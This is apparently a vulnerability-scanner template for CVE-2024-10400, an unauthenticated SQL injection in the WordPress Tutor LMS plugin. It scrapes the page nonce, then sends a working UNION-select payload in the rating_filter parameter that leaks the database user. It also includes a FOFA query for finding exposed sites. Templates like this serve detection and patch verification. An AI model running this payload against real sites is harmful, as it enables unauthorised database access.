id: CVE-2024-10400
info:
  name: WordPress Tutor LMS Plugin SQL Injection
  author: ZacharyZcR
  severity: critical
  description: |
    WordPress Tutor LMS plugin versions <= 2.7.6 contain an unauthenticated SQL injection vulnerability in the rating_filter parameter.
    The vulnerability exists due to insufficient escaping of user input. Attackers need to extract _tutor_nonce value from the page source first.
    FOFA: body="/wp-content/plugins/tutor/"
  reference:
    - cve: CVE-2024-10400
  tags: wordpress,sqli,tutor,plugin
  created: 2024/01/03

rules:
  r0:
    request:
      method: GET
      path: /
      headers:
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15
    expression: |
      response.status == 200 &&
      response.body.bcontains(b'tutor_nonce')

  r1:
    request:
      method: POST
      path: /wp-admin/admin-ajax.php
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: action=load_filtered_instructor&_tutor_nonce={{extract(r0, '"_tutor_nonce":"([^"]+)"')}}&rating_filter=1e0+and+1=0+Union+select+111,2222,3333,4,5,6,7,8,9,concat(0x7e,user(),0x7e),11,12,14--+-
    expression: |
      response.status == 200 &&
      response.body.bcontains(b'tutor-pagination-wrapper-replaceable') &&
      response.headers["Content-Type"].contains("application/json")

expression: r0() && r1()